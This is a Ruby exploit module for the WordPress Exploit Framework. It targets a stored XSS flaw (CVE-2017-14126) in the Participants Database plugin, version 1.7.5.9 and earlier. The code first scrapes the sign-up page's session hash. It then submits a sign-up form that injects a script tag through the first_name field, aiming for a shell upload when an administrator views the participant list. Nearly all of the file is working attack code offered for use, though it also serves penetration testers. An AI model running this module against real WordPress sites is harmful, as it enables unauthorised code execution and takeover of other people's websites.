# frozen_string_literal: true

class Wpxf::Exploit::ParticipantsDatabaseV1759XssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StoredXss

  def initialize
    super

    update_info(
      name: 'Participants Database <= 1.7.5.9 XSS Shell Upload',
      author: [
        'Benjamin Lim', # Vulnerability discovery
        'rastating'     # WPXF module
      ],
      references: [
        ['CVE', '2017-14126'],
        ['WPVDB', '8896']
      ],
      date: 'Sep 06 2017'
    )

    register_options([
      StringOption.new(
        name: 'sign_up_path',
        desc: 'The relative path of the Participants Database sign up page',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('participants-database', '1.7.5.10')
  end

  def vulnerable_page
    'the page containing the participant list'
  end

  def sign_up_url
    normalize_uri(full_uri, datastore['sign_up_path'])
  end

  def fetch_nonce
    res = execute_get_request(url: sign_up_url)
    return res.body[/name="session_hash"\s+type="hidden"\s+value="([a-z0-9]+)"/i, 1] if res && res.code == 200
  end

  def before_store
    self.session_hash = fetch_nonce

    if session_hash.nil?
      emit_error 'Failed to retrieve session hash / nonce'
      return false
    end

    true
  end

  def store_script
    execute_post_request(
      url: sign_up_url,
      body: {
        'action' => 'signup',
        'subsource' => 'participants-database',
        'shortcode_page=' => datastore['sign_up_path'],
        'thanks_page' => datastore['sign_up_path'],
        'instance_index' => '2',
        'pdb_data_keys' => '1.2.9.10',
        'session_hash' => session_hash,
        'first_name' => "<script>#{xss_include_script}</script>#{Wpxf::Utility::Text.rand_alpha(6)}",
        'last_name' => Wpxf::Utility::Text.rand_alpha(6),
        'email' => Wpxf::Utility::Text.rand_email,
        'mailing_list' => 'No',
        'submit_button' => 'Submit'
      }
    )
  end

  attr_accessor :session_hash
end
